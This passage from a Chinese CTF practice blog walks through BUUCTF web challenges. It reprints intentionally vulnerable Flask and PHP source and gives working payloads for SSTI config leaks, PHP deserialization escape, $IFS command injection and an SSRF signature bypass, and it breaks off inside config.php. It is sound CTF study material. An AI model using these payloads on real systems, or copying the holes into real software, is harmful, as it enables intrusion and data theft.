src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812164621882.png" alt="image-20210812164621882"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165152600.png" alt="image-20210812165152600"></p><p>输入id和价格，应该是购买独角兽，而且price只允许输入一位数，前三个买的时候都显示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165251531.png" alt="image-20210812165251531"></p><p>但是因为price的输入限制，所以我猜这里应该是要想办法购买第四个独角兽</p><p>这里要利用Unicode的编码，查找一个大于1337的字符</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>比如这个</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165952292.png" alt="image-20210812165952292"></p><p>成功拿到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170021095.png" alt="image-20210812170021095"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170027487.png" alt="image-20210812170027487"></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220813990.png" alt="image-20210812220813990"></p><p>看一眼hint</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220919778.png" alt="image-20210812220919778"></p><p>flag页面的登录框</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221024199.png" alt="image-20210812221024199"></p><p>这里存在ssti注入</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220731194.png" alt="image-20210812220731194"></p><p>可以试出来是twig模板，根据提示注入点应该在cookie里，抓包</p><p>通过修改user内容实现注入</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n&#39;s Blog</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221739824.png" alt="image-20210812221739824"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221614830.png" alt="image-20210812221614830"></p><p>ssti还是不太懂，毕竟我python还是没学会，遇到ssti的题我只能直接找payload，先放在这，等刷完buu第二页题目之后再回头看一遍</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>题目源码</p><pre class="language-python" data-language="python"><code class="language-python">#! &#x2F;usr&#x2F;bin&#x2F;env python# #encoding&#x3D;utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#39;latin1&#39;)app &#x3D; Flask(__name__)secert_key &#x3D; os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):        self.action &#x3D; action        self.param &#x3D; param        self.sign &#x3D; sign        self.sandbox &#x3D; md5(ip)        if(not os.path.exists(self.sandbox)):            os.mkdir(self.sandbox)    def Exec(self):        result &#x3D; &#123;&#125;        result[&#39;code&#39;] &#x3D; 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)                resp &#x3D; scan(self.param)                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):                    result[&#39;data&#39;] &#x3D; resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&#39;code&#39;] &#x3D; 200            if &quot;read&quot; in self.action:                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)                result[&#39;code&#39;] &#x3D; 200                result[&#39;data&#39;] &#x3D; f.read()            if result[&#39;code&#39;] &#x3D;&#x3D; 500:                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;        else:            result[&#39;code&#39;] &#x3D; 500            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;        return result         def checkSign(self):        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):            return True        else:            return False@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action &#x3D; &quot;scan&quot;    return getSign(action, param)@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip &#x3D; request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task &#x3D; Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&#39;&#x2F;&#39;)def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.debug &#x3D; False    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999)</code></pre><p>Flask框架，先看路由，geneSign是对传入的param与其他字符串拼接并返回其md5值，De1ta是主要，传入3个参数，以及ip，先判断param是否是gopher或者file开头的参数，不是则过到Task中，并且返回task的Exec()函数结果，另外hint给出提示在flag.txt中有flag</p><pre class="language-none"><code class="language-none">1：&#x2F;geneSign：获得url中parma参数，通过getSign(action, param)生成摘要2：&#x2F;De1ta：获得cookie中的action和sign，waf(param),创建task对象，调用exce()方法，json格式返回3：&#x2F;：返回源码</code></pre><p>三个函数</p><pre class="language-none"><code class="language-none">def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return False</code></pre><p>getSign：返回secert_key + param + action的哈希值<br>md5：<br>waf：禁止了flie和gopher协议</p><pre><code>task类class Task:    def __init__(self, action, param, sign, ip):        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)def Exec(self):    result = &#123;&#125;    result[&#39;code&#39;] = 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)            resp = scan(self.param)            if (resp == &quot;Connection Timeout&quot;):                result[&#39;data&#39;] = resp            else:                print resp                tmpfile.write(resp)                tmpfile.close()            result[&#39;code&#39;] = 200        if &quot;read&quot; in self.action:            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)            result[&#39;code&#39;] = 200            result[&#39;data&#39;] = f.read()        if result[&#39;code&#39;] == 500:            result[&#39;data&#39;] = &quot;Action Error&quot;    else:        result[&#39;code&#39;] = 500        result[&#39;msg&#39;] = &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) == self.sign):        return True    else:        return False</code></pre><p>checkSign：检查cookie中的sign<br>Exec：检查cookie中的action，如果scan在action中，将param的文件内容写入result.txt，如果read在action中，读出result.txt 的内容</p><p>hint提示flag在flag.txt 中，想要读到他<br>首先：action=scan，param=flag.txt ，将flag.txt的内容读到result.txt中<br>然后：action=read，将result.txt的内容读出</p><p>绕过点：sign<br>checkSign会检查cookie中的sign==getSign（param，action）<br>两个困难点：secert_key的值未知</p><p>思路：先进入/De1ta中的challenge函数，在Exec中的scan部分中将flag.txt的内容存入result.txt，然后从read部分中将其存到result字典中读出，再以json形式返回到客户端，我们就能得到flag。</p><p>写入与读出部分</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908232308596.png" alt="image-20210908232308596"></p><p>而如果action中既有scan,又有read,那么就会依次执行scan和read</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233510363.png" alt="image-20210908233510363"></p><p>而为了绕过这个验证，就要利用</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233542937.png" alt="image-20210908233542937"></p><p>让param = flag.txtread</p><p>因为action为scan</p><p>所以得到的md5值为keyflag.txtreadscan</p><p>满足action=readscan param=flag.txt时的值</p><p><strong>解题</strong></p><p>​    首先进入genesign页面得到md5(keyflag.txtreadscan)的值作为sign</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234141816.png" alt="image-20210908234141816"></p><p>在到de1ta界面抓包get进param=flag.php，在cookie内加入sign和action</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234443102.png" alt="image-20210908234443102"></p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>代码审计</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123;  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;  return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;  unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123;  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;  highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;  $userinfo &#x3D; unserialize($serialize_info);  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));  &#125;</code></pre><p>phpinfo里有东西，可以先看看</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812234826151.png" alt="image-20210812234826151"></p><p>接下来我们应该开始想怎么让</p><p>base64_decode($userinfo[&#39;img&#39;])的值等于flag的文件名</p><p><strong>知识点</strong></p><ul><li>反序列化中的对象逃逸</li><li>extract()变量覆盖</li></ul><p><strong>extract()变量覆盖</strong></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813004733910.png" alt="image-20210813004733910"></p><p>但是这里我们不能直接给img赋值，因为img赋值发生在extract之后</p><p><strong>反序列化中的对象逃逸</strong></p><p><strong>键值逃逸</strong></p><ul><li>因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</li><li>并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号<code>&#123;&#125;</code>外的就都被扔掉。</li></ul><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813005203142.png" alt="image-20210813005203142"></p><p>接下来是构造payload的部分</p><p>首先我们需要构造img属性：</p><p>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; </p><p>其中的ZDBnM19mMWFnLnBocA==是d0g3_f1ag.php的base64加密的结果然后在这个属性前面随便加上个序列化字符串（只要是合法的就行），比如：</p><p>;s:1:“1”;<br>;s:2:“10”;<br>;s:3:“100”;</p><p>所以payload可以为：</p><pre class="language-php" data-language="php"><code class="language-php">_SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre><p>session中存在phpflag的原因是由于filter函数会将匹配到的值变为空，而phpflag的长度刚好为7</p><p><strong>为7的原因</strong></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813010634981.png" alt="image-20210813010634981"></p><p>但是添加了filter函数来进行过滤之后</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813010753030.png" alt="image-20210813010753030"></p><p>原来的内容变为了</p><pre class="language-none"><code class="language-none">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre><p>能成功实现读取flag所在文件的命令</p><p>post后</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813011013959.png" alt="image-20210813011013959"></p><p>对/d0g3_fllllllag进行base64编码后为L2QwZzNfZmxsbGxsbGFn</p><p>所以直接把原来的编码替换掉就行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813011156367.png" alt="image-20210813011156367"></p><p>看是看懂了，但我还是想不到这种payload。。。</p><p>参考文章</p><p><a href="https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">安洵杯 2019]easy_serialize_php -------- 反序列化/序列化和代码审计_若丶时光破灭的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 初赛]Love Math - MustaphaMond - 博客园 (cnblogs.com)</a></p><p> <a href="https://blog.csdn.net/miuzzx/article/details/104817391">CISCN 2019 初赛]Love Math_羽的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_37589805/article/details/116205287?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">CISCN 2019 初赛]Love Math_分享简单的安全技术-CSDN博客</a></p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220705465.png" alt="image-20210828220705465"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220729509.png" alt="image-20210828220729509"></p><p>payload：</p><p>？num=1e10&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828221110477.png" alt="image-20210828221110477"></p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><pre class="language-none"><code class="language-none">import flaskimport osapp &#x3D; flask.Flask(__name__)app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;注册了一个名为FLAG的config，这里基本可以确定是flag。@app.route(&#39;&#x2F;&#39;)def index():    return open(__file__).read()@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;设置黑名单        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;把黑名单内的内容置空    return flask.render_template_string(safe_jinja(shrine))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(debug&#x3D;True)</code></pre><p>ssti注入，先试一个49</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230144787.png" alt="image-20210829230144787"></p><p>接下来就可以考虑在shrine下直接即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，在配合**globals()**，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230829515.png" alt="image-20210829230829515"></p><p>current_app意思应该是当前app，那我们就当前app下的config：</p><p>于是可以读到flag</p><pre class="language-none"><code class="language-none">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230933251.png" alt="image-20210829230933251"></p><p>也可以用</p><pre class="language-none"><code class="language-none">get_flashed_messages</code></pre><p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p><pre class="language-none"><code class="language-none">get_flashed_messages.__globals__[&#39;current_app&#39;].config</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829231104006.png" alt="image-20210829231104006"></p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>进入后是个登录页面，本来以为是sql注入，试了一下发现没能成功，扫目录扫到<a href="http://www.zip备份文件/">www.zip备份文件</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163607732.png" alt="image-20210903163607732"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903132345413.png" alt="image-20210903132345413"></p><p>访问一下register.php注册个账户就可以登录了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163626344.png" alt="image-20210903163626344"></p><p>再看其他的内容</p><p>profile.php</p><pre class="language-none"><code class="language-none">&lt;?php   require_once(&#39;class.php&#39;);   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;      die(&#39;Login First&#39;);       &#125;   $username &#x3D; $_SESSION[&#39;username&#39;];   $profile&#x3D;$user-&gt;show_profile($username);   if($profile  &#x3D;&#x3D; null) &#123;      header(&#39;Location: update.php&#39;);   &#125;   else &#123;      $profile &#x3D; unserialize($profile);      $phone &#x3D; $profile[&#39;phone&#39;];      $email &#x3D; $profile[&#39;email&#39;];      $nickname &#x3D; $profile[&#39;nickname&#39;];      $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));?&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phprequire(&#39;config.php&#39;);class user extends mysql&#123;   private $table &#x3D; &#39;users&#39;;   public function is_exists($username) &#123;      $username &#x3D; parent::filter($username);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      return parent::select($this-&gt;table, $where);   &#125;   public function register($username, $password) &#123;      $username &#x3D; parent::filter($username);      $password &#x3D; parent::filter($password);      $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);      $value_list &#x3D; Array($username, md5($password));      return parent::insert($this-&gt;table, $key_list, $value_list);   &#125;   public function login($username, $password) &#123;      $username &#x3D; parent::filter($username);      $password &#x3D; parent::filter($password);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      $object &#x3D; parent::select($this-&gt;table, $where);      if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;         return true;      &#125; else &#123;         return false;      &#125;   &#125;   public function show_profile($username) &#123;      $username &#x3D; parent::filter($username);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      $object &#x3D; parent::select($this-&gt;table, $where);      return $object-&gt;profile;   &#125;   public function update_profile($username, $new_profile) &#123;      $username &#x3D; parent::filter($username);      $new_profile &#x3D; parent::filter($new_profile);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);   &#125;   public function __tostring() &#123;      return __class__;   &#125;&#125;class mysql &#123;   private $link &#x3D; null;   public function connect($config) &#123;      $this-&gt;link &#x3D; mysql_connect(         $config[&#39;hostname&#39;],         $config[&#39;username&#39;],          $config[&#39;password&#39;]      );      mysql_select_db($config[&#39;database&#39;]);      mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);      return $this-&gt;link;   &#125;   public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;      $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;      $result &#x3D; mysql_query($sql, $this-&gt;link);      return mysql_fetch_object($result);   &#125;   public function insert($table, $key_list, $value_list) &#123;      $key &#x3D; implode(&#39;,&#39;, $key_list);      $value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;;       $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;      return mysql_query($sql);   &#125;   public function update($table, $key, $value, $where) &#123;      $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;      return mysql_query($sql);   &#125;   public function filter($string) &#123;      $escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);      $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;      $string &#x3D; preg_replace($escape, &#39;_&#39;, $string);      $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);      $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;      return preg_replace($safe, &#39;hacker&#39;, $string);   &#125;   public function __tostring() &#123;      return __class__;   &#125;&#125;session_start();$user &#x3D; new user();$user-&gt;connect($config);</code></pre><p>update.php</p><pre class="language-none"><code class="language-none">&lt;?php   require_once(&#39;class.php&#39;);   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;      die(&#39;Login First&#39;);       &#125;   if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;      $username &#x3D; $_SESSION[&#39;username&#39;];      if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))         die(&#39;Invalid phone&#39;);      if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))         die(&#39;Invalid email&#39;);            if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)         die(&#39;Invalid nickname&#39;);      $file &#x3D; $_FILES[&#39;photo&#39;];      if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)         die(&#39;Photo size error&#39;);      move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));      $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];      $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];      $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];      $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);      $user-&gt;update_profile($username, serialize($profile));      echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;   &#125;   else &#123;?&gt;</code></pre><p>config.php</p><pre class="language-none"><code class="language-none">&lt;?php   $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;   $config[&#39;username&#39;] &#x3D; &#39;root&#39;;   $config[&#39;password&#39;] &#x3D; &#39;&#39;;   $config[&#39;database&#39;] &#x3D; &#39;&#39;;   $flag &#x3D; 